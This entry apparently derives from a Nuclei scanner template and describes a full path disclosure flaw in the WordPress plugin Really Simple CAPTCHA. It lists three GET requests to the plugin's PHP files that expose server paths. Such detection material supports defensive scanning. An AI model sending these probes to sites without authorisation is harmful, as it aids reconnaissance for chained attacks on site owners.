# Vulnerability: WordPress Plugin Really Simple CAPTCHA - Full Path Disclosure
**Classification:** WORDPRESS
**Source:** Nuclei Template (`wp-really-simple-captcha-fpd.yaml`)

## Description
WordPress Plugin Really Simple CAPTCHA was detected to be vulnerable to Full Path Disclosure, allowing unauthenticated attackers to obtain the full application path that could aid other attacks when combined with another vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/really-simple-captcha/really-simple-captcha.php
GET {{BaseURL}}/wp-content/plugins/really-simple-captcha/includes/filesystem.php
GET {{BaseURL}}/wp-content/plugins/really-simple-captcha/uninstall.php
```

